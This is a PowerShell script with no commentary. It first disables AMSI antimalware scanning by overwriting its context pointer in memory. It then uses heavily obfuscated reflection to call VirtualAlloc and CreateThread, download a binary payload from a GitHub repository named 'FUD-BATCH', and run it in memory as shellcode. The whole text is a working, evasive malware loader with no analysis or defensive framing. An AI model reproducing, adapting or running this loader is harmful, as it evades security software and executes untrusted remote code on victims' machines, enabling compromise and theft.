# First Script
$randomFields=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetFields('NonPublic,Static')
$randomAmsiContext=$randomFields | Where-Object { $_ -like "*Context" }
[IntPtr]$amsiPointer=$randomAmsiContext.GetValue($null)

[Int32[]]$zeroBuffer = @(0);
[System.Runtime.InteropServices.Marshal]::Copy($zeroBuffer, 0, $amsiPointer, 1)

# Delay for 5 seconds
Start-Sleep -Seconds 5

# Second Script
$ProgressPreference = ('Sil'+'ent'+'l'+'yContinu'+'e')

function Invoke-SecureLoader {
    Param ($moduleName, $functionName)
    $assemblyRef = ([AppDomain]::"cU`R`Re`NTdOMaIn".(('GE'+'T')+('as'+'S')+('EmBLIe'+'S')).Invoke() | ? { $_."GlO`BaLasS`eMBLY`C`AchE" -and $_."lo`Ca`TIoN".('sp'+('L'+'It')).Invoke((('qw'+'IqwI').rEplAcE(([chAr]113+[chAr]119+[chAr]73),[sTriNG][chAr]92)))[-1].('Eq'+('u'+'al')+'S').Invoke(('Syst'+'e'+'m.dll')) }).(('g'+'ET')+'Ty'+'Pe').Invoke(('M'+'icrosoft.Win3'+'2.Uns'+'afeNa'+'tive'+'Metho'+'ds'))
    $procAddress = $assemblyRef.('gE'+'t'+('METh'+'ODS')).Invoke() | Where-Object { $_."NA`Me" -eq ('Get'+'P'+'rocAddre'+'ss') }
    $getHandle = $assemblyRef.(('getm'+'e')+('tho'+'d')).Invoke(('Ge'+'tModuleHa'+'nd'+'le'))
    $handle = $getHandle."In`V`OKE"($null, @($moduleName));[IntPtr] $result = 0
    if ($handle -ne $null) { $result = $procAddress[0]."i`Nv`oKe"($null, @($handle, $functionName))}
    if ($result -eq [IntPtr]::"ZE`RO") {
        $handleReference = [System.Runtime.InteropServices.HandleRef]::('N'+'Ew').Invoke($null, $handle)
        $result = $procAddress[0]."In`V`okE"($null, @($handleReference, $functionName))
    }
    return $result
}

function Generate-SecureDelegates {
    Param ([Parameter(poSItiOn = 0, manDaTOry = $True)] [Type[]] $paramType, [Parameter(pOSITion = 1)] [Type] $returnType = [Void])
    $dynamicType = [AppDomain]::"CurR`eNTDoM`AiN".(('d'+'EfIn')+('Ed'+'yna')+'m'+('iCAssE'+'MBL'+'Y')).Invoke((New-Object System.Reflection.AssemblyName(('R'+'eflect'+'edDelegat'+'e'))), [System.Reflection.Emit.AssemblyBuilderAccess]::"r`UN").('DE'+('finedy'+'nA')+('Micm'+'O')+'dU'+'lE').Invoke(('I'+'nMem'+'oryM'+'od'+'ule'), $false).(('dEF'+'in')+'e'+('Ty'+'pE')).Invoke(('DynamicType'), ('Cl'+'as'+'s, P'+'ublic, Se'+'al'+'ed'+', '+'Ansi'+'C'+'lass, AutoClass'), [System.MulticastDelegate])
    $dynamicType."d`e`FIneCon`stRu`cTor"(('R'+'TSp'+'ec'+'i'+'al'+'Name, Hid'+'eByS'+'ig, Publi'+'c'), [System.Reflection.CallingConventions]::"StANd`ArD", $paramType).(('setIMP'+'L')+('em'+'en')+('T'+'ati')+'On'+'F'+('L'+'ag')+'s').Invoke(('Ru'+'ntime, Manag'+'e'+'d'))
    $dynamicType.(('d'+'eFin')+'e'+('Met'+'hOD')).Invoke('Invoke', ('P'+'ubl'+'ic,'+' HideB'+'ySig, '+'N'+'ew'+'Slot, Virtu'+'al'), $returnType, $paramType).(('s'+'Et')+'i'+('MP'+'L')+'eM'+('e'+'Ntati'+'Onf')+'La'+'gs').Invoke(('R'+'untime,'+' Mana'+'ged'))
    return $dynamicType.(('Cr'+'E')+('at'+'eT')+'y'+'pE').Invoke()
}

$encryptedPayload = (iwr -UseBasicParsing "https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads/main/codex.bin").Content
$memoryLocation = [System.Runtime.InteropServices.Marshal]::('G'+('Etde'+'Le'+'ga')+('TEFo'+'r')+('fu'+'N')+'c'+('ti'+'Onp')+('OIN'+'T'+'ER')).Invoke((Invoke-SecureLoader kernel32.dll VirtualAlloc), (Generate-SecureDelegates @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr])))."IN`VOke"([IntPtr]::"zE`RO", $encryptedPayload."l`EnGTh", 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::('Co'+'pY').Invoke($encryptedPayload, 0, $memoryLocation, $encryptedPayload."Le`N`GtH")
$executionThread = [System.Runtime.InteropServices.Marshal]::('ge'+('Tde'+'L')+('E'+'gatE')+'Fo'+'R'+('func'+'TI'+'oNp')+'oi'+'NT'+'eR').Invoke((Invoke-SecureLoader kernel32.dll CreateThread), (Generate-SecureDelegates @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr])))."Invo`Ke"([IntPtr]::"ZE`Ro", 0, $memoryLocation, [IntPtr]::"ze`Ro", 0, [IntPtr]::"zE`Ro")
[System.Runtime.InteropServices.Marshal]::(('get'+'DELE'+'G')+('at'+'e')+'F'+'oR'+('f'+'unC')+'TI'+('ONP'+'oIn')+('t'+'er')).Invoke((Invoke-SecureLoader kernel32.dll WaitForSingleObject), (Generate-SecureDelegates @([IntPtr], [Int32])([Int])))."I`NvOKe"($executionThread, 0xFFFFFFFF)
